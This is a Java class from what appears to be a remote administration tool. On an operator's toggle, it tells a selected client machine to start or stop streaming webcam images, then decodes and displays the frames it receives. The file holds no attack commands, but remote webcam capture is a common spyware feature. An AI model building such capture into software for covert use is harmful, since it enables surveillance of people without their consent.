package Server.FeatureListener;

import Events.FeatureListener;
import Handler.Message;
import Server.ClientEntity.ClientEntity;
import Server.Overlay.Controller.Controller;
import Server.Server;
import Tools.GraphicsConfigurator;
import Tools.Network.NetworkInterface;
import Tools.Ref;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;

import static Tools.Globals.Sleep;

public class CameraCaptureListener extends FeatureListener {

    public CameraCaptureListener(Controller controller, Server server) {
        super(controller, server);
    }

    @Override
    public Runnable run(Controller controller) {
        return () -> {
            while (runningFeature) {
                byte[] buffer = server.getBuffer();

                Sleep(1000 / 60);

                if (buffer == null ||  buffer[0] != NetworkInterface.CommandByte.CAMERA_BYTE) continue;

                Message<byte[]> currentInfo = (Message<byte[]>) objectHandler.readModifiedObjects(buffer);
                BufferedImage image = null;
                if (currentInfo.get() instanceof byte[] s) {
                    image = toImage(s);
                }
                if (image == null) continue;

                controller.cameraCaptureImageView.setPreserveRatio(false);
                final int width = (int) controller.cameraCapturePane.getPrefWidth();
                final int height = (int) controller.cameraCapturePane.getPrefHeight();
                controller.cameraCaptureImageView.setImage(GraphicsConfigurator.resize(image, width, height));

                final int widthExpand = (int) controller.cameraCaptureExpandImageView.getFitWidth();
                final int heightExpand = (int) controller.cameraCaptureExpandImageView.getFitHeight();
                if (widthExpand > 0 && heightExpand > 0)
                    controller.cameraCaptureExpandImageView.setImage(GraphicsConfigurator.resize(image, widthExpand, heightExpand));
            }
            GraphicsConfigurator.drawColor(controller.cameraCaptureImageView, Color.LIGHT_GRAY);
            if(controller.desktopCaptureExpandImageView.getFitWidth() > 0)
                GraphicsConfigurator.drawColor(controller.cameraCaptureExpandImageView, Color.LIGHT_GRAY);
        };
    }

    @Override
    public void initComponents(Ref<ClientEntity> selectedClientSup) {
        controller.cameraCaptureButton.selectedProperty().addListener((observableValue, oldValue, newValue) -> {
            ClientEntity selectedClient = selectedClientSup.obj;
            if (newValue && selectedClient != null) {
                runningFeature = true;
                thread.execute(run(controller));
                try {
                    packetHandler.send(new byte[]{NetworkInterface.CommandByte.CAMERA_BYTE}, 1, selectedClient.getAddress(), selectedClient.getPort());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (oldValue && selectedClient != null) {
                runningFeature = false;
                try {
                    packetHandler.send(new byte[]{NetworkInterface.CommandByte.CAMERA_BYTE_STOP}, 1, selectedClient.getAddress(), selectedClient.getPort());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private BufferedImage toImage(byte[] data) {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(data)) {
            return ImageIO.read(bis);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void disposeAll() {
        runningFeature = false;
        thread.shutdown();
    }
}
